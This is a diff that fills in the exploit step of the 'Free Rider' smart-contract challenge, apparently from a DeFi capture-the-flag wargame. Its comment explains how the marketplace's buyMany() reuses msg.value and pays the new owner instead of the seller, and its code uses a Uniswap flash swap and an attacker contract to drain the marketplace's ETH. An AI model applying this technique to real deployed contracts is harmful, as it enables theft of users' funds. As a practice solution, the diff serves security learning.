@@ -104,7 +104,26 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            Two main vulnerabilities can be identified in the marketplace contract :
+                1. The loop in 'buyMany()' reuse the 'msg.value' from the initial transaction allowing for continous buying of NFTs at the price of one
+                2. NFT ownership is transferred before paying seller, resulting in paying buyer instead in the next call after 'safeTransferFrom()'
+            By leveraging the flash swap capabilities of Uniswap, we can grab the required ETH to buy one NFT and subsequently transfer the rest of them to
+            our buyer friend, grabbing the 75 ETH remaining in the marketplace in the process (MARKETPLACE_INITIAL_ETH_BALANCE - NFT_PRICE).
+        */
+
+        const AttackerContractFactory = await ethers.getContractFactory('GhostRider', attacker);
+        this.attackerContract = await (await AttackerContractFactory.deploy(attacker.address, this.buyerContract.address, this.nft.address, this.marketplace.address)).connect(attacker);
+
+        await (await this.uniswapPair.connect(attacker)).swap(
+            NFT_PRICE,
+            0, 
+            this.attackerContract.address,
+            ethers.utils.defaultAbiCoder.encode(["uint256[]"], [[0, 1, 2, 3, 4, 5]])
+        ); // Initiate flash swap and trigger callback function in our contract
+
+        await this.attackerContract.sweep(); // Receive ETH from our contract to wallet and enjoy 45 ETH reward + 5*15 ETH profit for a total of 120 ETH profit
+        console.log("\nFinal attacker ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
     });
 
     after(async function () {
